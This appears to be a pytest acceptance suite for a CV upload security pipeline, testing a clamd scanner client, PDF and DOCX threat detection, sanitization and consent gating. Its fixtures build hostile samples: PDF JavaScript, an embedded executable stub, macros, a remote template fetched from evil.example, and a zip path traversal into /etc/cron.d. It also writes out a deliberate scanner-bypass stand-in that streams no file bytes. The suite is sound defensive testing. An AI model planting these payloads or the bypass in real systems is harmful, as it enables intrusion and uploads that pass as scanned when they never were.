"""CV upload security pipeline acceptance tests (whitepaper §11) — before code.

Controls under test: magic-byte MIME sniffing (extension is never trusted),
size and page limits, the malware engine (a real clamd client, its three-way
readiness state and the declared policy for an upload nobody could scan),
structural PDF inspection (encryption, JavaScript, embedded files,
open-actions), DOCX inspection (macros, OLE embeddings, remote templates, zip
anomalies), metadata-stripping sanitization, sandboxed text extraction
(timeout + memory), and the consent gate: nothing is processed before the
required consents exist.

The engine tests run a real clamd-speaking socket server in a thread rather
than a mock: the failure that shipped was a scanner interface with nothing
behind it, so a test that only proves the interface is called would have
passed then too.
"""

from __future__ import annotations

import contextlib
import io
import os
import socket
import struct
import tempfile
import threading
import time
import uuid
import zipfile
from collections.abc import Iterator

import pytest
from pypdf import PdfReader, PdfWriter

from career.db.session import tenant_session
from career.onboarding import consents, upload
from career.storage import FilesystemStorageAdapter

# ── file builders ────────────────────────────────────────────────────────────


def _pdf_with_text(text: str = "Hello CV") -> bytes:
    """A minimal valid single-page PDF with real text (offsets computed)."""
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    stream = f"BT /F1 24 Tf 72 720 Td ({text}) Tj ET".encode()
    objs.append(
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream
        + b"\nendstream"
    )
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n")
    offsets = []
    for i, body in enumerate(objs, start=1):
        offsets.append(out.tell())
        out.write(f"{i} 0 obj\n".encode() + body + b"\nendobj\n")
    xref_at = out.tell()
    out.write(f"xref\n0 {len(objs) + 1}\n".encode())
    out.write(b"0000000000 65535 f \n")
    for off in offsets:
        out.write(f"{off:010d} 00000 n \n".encode())
    out.write(
        f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_at}\n%%EOF".encode()
    )
    return out.getvalue()


def _blank_pdf(pages: int = 1) -> bytes:
    w = PdfWriter()
    for _ in range(pages):
        w.add_blank_page(width=612, height=792)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _pdf_with_javascript() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.add_js("app.alert('pwned');")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _pdf_with_attachment() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.add_attachment("payload.bin", b"MZ\x90\x00evil")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _encrypted_pdf() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.encrypt("secret")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


_DOCX_CT = (
    '<?xml version="1.0"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="xml" '
    'ContentType="application/vnd.openxmlformats-officedocument'
    '.wordprocessingml.document.main+xml"/></Types>'
)


def _docx(text: str = "Hello DOCX", extra: dict[str, bytes] | None = None) -> bytes:
    doc = (
        '<?xml version="1.0"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/'
        'wordprocessingml/2006/main"><w:body>'
        f"<w:p><w:r><w:t>{text}</w:t></w:r></w:p>"
        "</w:body></w:document>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _DOCX_CT)
        z.writestr("word/document.xml", doc)
        z.writestr("docProps/core.xml", "<coreProperties>secret author</coreProperties>")
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


class CleanScanner:
    def scan(self, data: bytes) -> str | None:
        return None


class EvilScanner:
    def scan(self, data: bytes) -> str | None:
        return "Eicar-Test-Signature"


LIMITS = upload.Limits(max_bytes=1_000_000, max_pages=5, timeout_s=10.0)


def _validate(data: bytes) -> upload.ScanReport:
    return upload.validate_upload(data, scanner=CleanScanner(), limits=LIMITS)


# ── MIME sniffing: magic bytes, never the extension ──────────────────────────


def test_pdf_and_docx_are_sniffed_by_magic_bytes() -> None:
    assert _validate(_pdf_with_text()).mime == "application/pdf"
    assert _validate(_docx()).mime == (
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    )


def test_exe_bytes_are_rejected_whatever_the_name_says() -> None:
    report = _validate(b"MZ\x90\x00\x03definitely-not-a-cv")
    assert not report.ok
    assert "unrecognized_file_type" in report.findings


def test_plain_zip_is_not_a_docx() -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("random.txt", "hi")
    report = _validate(buf.getvalue())
    assert "unrecognized_file_type" in report.findings


# ── size and page limits ─────────────────────────────────────────────────────


def test_oversize_file_is_rejected_before_parsing() -> None:
    report = _validate(b"%PDF-1.4" + b"\x00" * LIMITS.max_bytes)
    assert "size_exceeds_limit" in report.findings


def test_page_bomb_is_rejected() -> None:
    report = _validate(_blank_pdf(pages=LIMITS.max_pages + 1))
    assert "pdf_page_limit_exceeded" in report.findings


def test_page_count_is_recorded_for_clean_files() -> None:
    report = _validate(_blank_pdf(pages=3))
    assert report.ok
    assert report.page_count == 3


# ── malware scanner is injectable and authoritative ──────────────────────────


def test_scanner_finding_rejects_the_file() -> None:
    report = upload.validate_upload(
        _pdf_with_text(), scanner=EvilScanner(), limits=LIMITS
    )
    assert "malware_detected:Eicar-Test-Signature" in report.findings


# ── the real engine: a clamd-speaking socket, not a mock ─────────────────────


def _recv_exact(conn: socket.socket, n: int, pending: bytearray) -> bytes:
    while len(pending) < n:
        chunk = conn.recv(65536)
        if not chunk:
            break
        pending.extend(chunk)
    out = bytes(pending[:n])
    del pending[:n]
    return out


def _drain_request(conn: socket.socket) -> bytes | None:
    """Speak clamd's side of the wire properly and KEEP what was streamed.

    The command is NUL-terminated, and INSTREAM is length-prefixed chunks
    ending in a zero length. Sniffing for four zero bytes would misread a PDF
    that happens to contain them.

    Returns the reassembled payload for an INSTREAM, or None for any other
    command (a PING streams nothing, and «nothing» is the right answer for it,
    not an empty scan).

    It used to return nothing at all: the chunks were read off the socket and
    dropped. That made this harness answer «clean» to a scanner that opened the
    stream, sent the terminator and NO FILE BYTES — which is exactly the shape
    of the stand-in that shipped, and a real clamd answers `stream: OK` to an
    empty stream, so such a client reads green in production while stamping
    every `cv_uploads` row `clean`. The whole argument for running a real
    socket server instead of a mock (see the module docstring) is that an
    interface being called is not the same as the file being scanned — and the
    harness was proving only that the interface was called.
    """
    pending = bytearray()
    cmd = bytearray()
    while b"\x00" not in cmd:
        byte = _recv_exact(conn, 1, pending)
        if not byte:
            return None
        cmd.extend(byte)
    if not bytes(cmd).startswith(b"zINSTREAM"):
        return None
    streamed = bytearray()
    while True:
        header = _recv_exact(conn, 4, pending)
        if len(header) < 4:
            return bytes(streamed)
        size = struct.unpack("!I", header)[0]
        if size == 0:
            return bytes(streamed)
        streamed.extend(_recv_exact(conn, size, pending))


class _FakeClamd:
    """The stand-in daemon, plus what it was actually sent.

    `streamed` holds one entry per INSTREAM the client opened, in order. A test
    that never reads it is a test that only proves the socket was dialled.
    """

    def __init__(self, path: str) -> None:
        self.path = path
        self.streamed: list[bytes] = []

    def assert_received(self, data: bytes) -> None:
        """The bytes on the wire were the file — the assertion that was missing.

        Deliberately not a length check: a client that streams the right NUMBER
        of bytes from the wrong buffer is a bug this harness should be able to
        see, and `len(a) == len(b)` cannot.
        """
        assert self.streamed, (
            "the scanner never opened an INSTREAM — nothing was scanned, and a "
            "clean verdict would be a guess"
        )
        assert self.streamed[-1] == data, (
            "the scanner streamed "
            f"{len(self.streamed[-1])} bytes, the file is {len(data)} — clamd "
            "answers OK to whatever it is given, including nothing"
        )


@contextlib.contextmanager
def _fake_clamd(reply: bytes, *, delay: float = 0.0) -> Iterator[_FakeClamd]:
    """A clamd stand-in on a real unix socket. Yields the server handle."""
    directory = tempfile.mkdtemp()  # short path: AF_UNIX caps at ~107 bytes
    path = os.path.join(directory, "clamd.sock")
    fake = _FakeClamd(path)
    stop = threading.Event()
    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server.bind(path)
    server.listen(4)
    server.settimeout(0.2)

    def _serve() -> None:
        while not stop.is_set():
            try:
                conn, _ = server.accept()
            except (TimeoutError, OSError):
                continue
            with conn:
                conn.settimeout(3.0)
                try:
                    streamed = _drain_request(conn)
                    if streamed is not None:
                        fake.streamed.append(streamed)
                    if delay:
                        time.sleep(delay)
                    conn.sendall(reply)
                except OSError:
                    pass

    thread = threading.Thread(target=_serve, daemon=True)
    thread.start()
    try:
        yield fake
    finally:
        stop.set()
        thread.join(timeout=5)
        server.close()
        os.unlink(path)
        os.rmdir(directory)


def test_clamd_reports_a_clean_file() -> None:
    data = _pdf_with_text()
    with _fake_clamd(b"stream: OK\x00") as server:
        assert upload.ClamdScanner(server.path, timeout_s=3.0).scan(data) is None
    # «no finding» only means «clean» if the engine saw the file.
    server.assert_received(data)


def test_clamd_detection_becomes_a_malware_finding() -> None:
    data = _pdf_with_text()
    with _fake_clamd(b"stream: Win.Test.EICAR_HDB-1 FOUND\x00") as server:
        report = upload.validate_upload(
            data,
            scanner=upload.ClamdScanner(server.path, timeout_s=3.0),
            limits=LIMITS,
        )
    assert not report.ok
    assert "malware_detected:Win.Test.EICAR_HDB-1" in report.findings
    assert report.scanned
    server.assert_received(data)


def test_the_whole_file_reaches_the_engine_in_chunks() -> None:
    """A file bigger than one INSTREAM chunk must arrive whole and in order.

    The reassembled payload is compared byte for byte, so a client that drops
    the tail, reorders chunks, or streams a truncated copy is visible — a
    scanner that shows clamd the first kilobyte of a CV and calls the answer
    clean is scanning a header, not a document.
    """
    data = _blank_pdf(pages=4) + b"%tail-marker-" + os.urandom(64)
    with _fake_clamd(b"stream: OK\x00") as server:
        assert upload.ClamdScanner(server.path, timeout_s=5.0).scan(data) is None
    server.assert_received(data)


class _EmptyStreamScanner:
    """The stand-in that would read green everywhere else.

    It speaks the protocol correctly — connect, `zINSTREAM`, terminating zero
    length, read the reply — and sends no file bytes. A real clamd answers
    `stream: OK` to an empty stream, so this returns «no finding», the row is
    stamped `clean`, `report.scanned` is True, and the health probe is a PING
    that passes. Nothing anywhere in the product can tell it from a scanner.
    """

    def __init__(self, socket_path: str) -> None:
        self.socket_path = socket_path

    def scan(self, data: bytes) -> str | None:
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
            sock.settimeout(3.0)
            sock.connect(self.socket_path)
            sock.sendall(b"zINSTREAM\x00" + struct.pack("!I", 0))
            reply = sock.recv(1024).split(b"\x00", 1)[0].decode()
        return None if reply.strip().endswith("OK") else reply


def test_the_harness_notices_a_scanner_that_streams_nothing() -> None:
    """The bypass, walked on purpose.

    Every assertion the old harness made about this scanner passes: it returns
    None, `validate_upload` reports ok and `scanned`, and the file is accepted.
    The only thing that separates it from a real scan is what arrived on the
    wire, which is why that is now asserted everywhere the harness is used.
    """
    data = _pdf_with_text()
    with _fake_clamd(b"stream: OK\x00") as server:
        scanner = _EmptyStreamScanner(server.path)
        report = upload.validate_upload(data, scanner=scanner, limits=LIMITS)

    assert report.ok and report.scanned          # indistinguishable, upstream
    assert server.streamed == [b""]              # and unmistakable, here
    with pytest.raises(AssertionError, match="clamd answers OK"):
        server.assert_received(data)


def test_clamd_ping_is_the_ready_light() -> None:
    with _fake_clamd(b"PONG\x00") as server:
        health = upload.scanner_health(upload.ClamdScanner(server.path, timeout_s=3.0))
    assert health.state == upload.SCANNER_READY
    assert health.ok and health.engine == "clamd"
    # a readiness probe must never send a customer's bytes anywhere (§15.13)
    assert server.streamed == []


def test_engine_timeout_is_a_declared_rejection_not_a_pass() -> None:
    """The hang is the dangerous one: an engine that never answers used to be
    indistinguishable from an engine that said OK."""
    with _fake_clamd(b"stream: OK\x00", delay=3.0) as server:
        path = server.path
        scanner = upload.ClamdScanner(path, timeout_s=0.4)
        with pytest.raises(upload.ScannerUnavailable) as err:
            scanner.scan(_pdf_with_text())
        assert "timeout" in str(err.value)
        report = upload.validate_upload(
            _pdf_with_text(), scanner=scanner, limits=LIMITS
        )
    assert not report.ok
    assert "scanner_unavailable:engine_timeout" in report.findings


def test_engine_unreachable_rejects_and_shows_a_red_light() -> None:
    scanner = upload.ClamdScanner("/nonexistent/clamd.sock", timeout_s=1.0)
    with pytest.raises(upload.ScannerUnavailable):
        scanner.scan(_pdf_with_text())
    health = upload.scanner_health(scanner)
    assert health.state == upload.SCANNER_UNREACHABLE
    assert health.detail == "engine_unreachable"
    report = upload.validate_upload(_pdf_with_text(), scanner=scanner, limits=LIMITS)
    assert "scanner_unavailable:engine_unreachable" in report.findings


def test_unreachable_engine_may_be_degraded_deliberately() -> None:
    """Configurable, because an operator riding out a daemon outage should be
    able to choose to keep selling — visibly, with every row marked."""
    scanner = upload.ClamdScanner("/nonexistent/clamd.sock", timeout_s=1.0)
    report = upload.validate_upload(
        _pdf_with_text(), scanner=scanner, limits=LIMITS,
        policy=upload.ScanPolicy(on_unavailable=upload.ACCEPT_UNSCANNED),
    )
    assert report.ok
    assert not report.scanned
    assert report.unscanned_reason == "engine_unreachable"


def test_no_engine_configured_accepts_but_never_claims_clean() -> None:
    scanner = upload.build_scanner("")
    assert isinstance(scanner, upload.UnconfiguredScanner)
    assert upload.scanner_health(scanner).state == upload.SCANNER_ABSENT
    report = upload.validate_upload(_pdf_with_text(), scanner=scanner, limits=LIMITS)
    assert report.ok                      # the paying customer is not blocked
    assert not report.scanned             # and we do not pretend otherwise
    assert report.unscanned_reason == "no_engine_configured"


def test_absent_engine_can_be_made_fail_closed() -> None:
    report = upload.validate_upload(
        _pdf_with_text(), scanner=upload.UnconfiguredScanner(), limits=LIMITS,
        policy=upload.ScanPolicy(on_absent=upload.REJECT),
    )
    assert "scanner_unavailable:no_engine_configured" in report.findings


def test_file_above_the_engine_size_bound_is_never_streamed() -> None:
    """clamd aborts an over-limit stream mid-send, which reads back as a
    network fault. The bound is ours to check, and it is checked before the
    socket is even opened — the path here does not exist."""
    scanner = upload.ClamdScanner("/nonexistent/clamd.sock", max_bytes=1024)
    with pytest.raises(upload.ScannerUnavailable) as err:
        scanner.scan(b"%PDF-1.4" + b"\x00" * 2048)
    assert str(err.value) == "file_exceeds_scanner_limit"


def test_a_scanner_with_no_health_contract_is_never_green() -> None:
    """The stand-in that shipped answered every file «clean» and had nothing to
    ask about its readiness. Anything shaped like it now reads red."""
    health = upload.scanner_health(CleanScanner())
    assert health.state == upload.SCANNER_UNREACHABLE
    assert health.detail == "scanner_reports_no_health"


def test_build_scanner_reads_the_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("CV_SCAN_CLAMD_SOCKET", raising=False)
    assert isinstance(upload.build_scanner(), upload.UnconfiguredScanner)
    monkeypatch.setenv("CV_SCAN_CLAMD_SOCKET", "/var/run/clamav/clamd.ctl")
    built = upload.build_scanner()
    assert isinstance(built, upload.ClamdScanner)
    assert built.socket_path == "/var/run/clamav/clamd.ctl"


# ── structural PDF threats ───────────────────────────────────────────────────


def test_pdf_javascript_is_rejected() -> None:
    report = _validate(_pdf_with_javascript())
    assert any(f.startswith("pdf_javascript") for f in report.findings)


def test_pdf_embedded_files_are_rejected() -> None:
    report = _validate(_pdf_with_attachment())
    assert any(f.startswith("pdf_embedded") for f in report.findings)


def test_encrypted_pdf_is_rejected() -> None:
    report = _validate(_encrypted_pdf())
    assert "pdf_encrypted" in report.findings


# ── structural DOCX threats ──────────────────────────────────────────────────


def test_docx_macros_are_rejected() -> None:
    report = _validate(_docx(extra={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0macros"}))
    assert "docx_macros" in report.findings


def test_docx_ole_embeddings_are_rejected() -> None:
    report = _validate(_docx(extra={"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"}))
    assert "docx_ole_embeddings" in report.findings


def test_docx_remote_template_is_rejected() -> None:
    rels = (
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats'
        '.org/package/2006/relationships"><Relationship Id="rId1" Type="http://'
        "schemas.openxmlformats.org/officeDocument/2006/relationships/"
        'attachedTemplate" Target="http://evil.example/t.dotm" '
        'TargetMode="External"/></Relationships>'
    )
    report = _validate(_docx(extra={"word/_rels/settings.xml.rels": rels}))
    assert "docx_remote_template" in report.findings


def test_docx_zip_anomalies_are_rejected() -> None:
    traversal = _docx(extra={"../../etc/cron.d/evil": b"boom"})
    report = _validate(traversal)
    assert any(f.startswith("zip_anomaly") for f in report.findings)


# ── sanitization strips metadata and active content ──────────────────────────


def test_pdf_sanitization_drops_javascript_attachments_and_metadata() -> None:
    dirty = _pdf_with_javascript()
    clean = upload.sanitize_pdf(dirty)
    r = PdfReader(io.BytesIO(clean))
    root = r.trailer["/Root"]
    names = root.get("/Names")
    assert names is None or (
        "/JavaScript" not in names and "/EmbeddedFiles" not in names
    )
    assert "/OpenAction" not in root
    meta = r.metadata
    assert meta is None or not meta.get("/Author")


def test_docx_sanitization_drops_docprops() -> None:
    clean = upload.sanitize_docx(_docx())
    with zipfile.ZipFile(io.BytesIO(clean)) as z:
        assert not [n for n in z.namelist() if n.startswith("docProps/")]
        assert "word/document.xml" in z.namelist()


# ── sandboxed text extraction ────────────────────────────────────────────────


def test_pdf_text_is_extracted_in_the_sandbox() -> None:
    text = upload.extract_text_sandboxed(_pdf_with_text("Hello CV"), "pdf", LIMITS)
    assert "Hello CV" in text


def test_docx_text_is_extracted_in_the_sandbox() -> None:
    text = upload.extract_text_sandboxed(_docx("خبرة عشر سنوات"), "docx", LIMITS)
    assert "خبرة عشر سنوات" in text


def test_sandbox_kills_a_hung_extractor() -> None:
    with pytest.raises(upload.ExtractionFailed) as err:
        upload._run_sandboxed(
            ["python3", "-c", "import time; time.sleep(30)"],
            b"",
            timeout_s=0.5,
        )
    assert "timeout" in str(err.value)


# ── the end-to-end service: consent gate first, honest row states ────────────


def _grant_required(session, tenant_id: uuid.UUID) -> None:
    for p in consents.REQUIRED_KEYS:
        consents.record_consent(session, tenant_id=tenant_id, purpose=p, action="granted")


def test_processing_refuses_before_consent(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        with pytest.raises(consents.ConsentMissing):
            upload.process_cv_upload(
                s, tenant_id=uuid.UUID(a), data=_pdf_with_text(),
                original_filename="cv.pdf", scanner=CleanScanner(),
                storage=storage, limits=LIMITS,
            )


def test_clean_pdf_is_stored_sanitized_with_extracted_text(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=_pdf_with_text("Hello CV"),
            original_filename="cv.pdf", scanner=CleanScanner(),
            storage=storage, limits=LIMITS,
        )
        assert row.status == "processed"
        assert row.scan_status == "clean"
        assert row.mime_detected == "application/pdf"
        assert row.page_count == 1
        assert row.sha256 and len(row.sha256) == 64
        assert row.document_id is not None
        assert row.extracted_text_storage_key
        text = storage.get(row.extracted_text_storage_key).decode("utf-8")
        assert "Hello CV" in text


def test_unscanned_upload_is_processed_but_says_so_in_its_row(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    """The paid customer still gets their upload; the row stops lying about it.
    ``scan_status`` read «clean» for every file the product ever took, on a
    host with no engine at all."""
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=_pdf_with_text("Hello CV"),
            original_filename="cv.pdf", scanner=upload.UnconfiguredScanner(),
            storage=storage, limits=LIMITS,
        )
        assert row.status == "processed"
        assert row.scan_status == "unscanned"
        assert row.scan_findings["unscanned"] == "no_engine_configured"
        assert row.document_id is not None


def test_a_scanned_clean_upload_still_says_clean(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    data = _pdf_with_text("Hello CV")
    with _fake_clamd(b"stream: OK\x00") as server, tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=data,
            original_filename="cv.pdf",
            scanner=upload.ClamdScanner(server.path, timeout_s=3.0),
            storage=storage, limits=LIMITS,
        )
        assert row.scan_status == "clean"
        assert "unscanned" not in row.scan_findings
    # end to end: the row says `clean` AND the engine was shown the file the
    # customer sent — the two facts the shipped stand-in decoupled.
    server.assert_received(data)


def test_malicious_pdf_is_rejected_and_nothing_is_stored(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=_pdf_with_javascript(),
            original_filename="cv.pdf", scanner=CleanScanner(),
            storage=storage, limits=LIMITS,
        )
        assert row.status == "rejected"
        assert row.scan_status == "rejected"
        assert any(f.startswith("pdf_javascript") for f in row.scan_findings["findings"])
        assert row.document_id is None
        assert row.extracted_text_storage_key is None
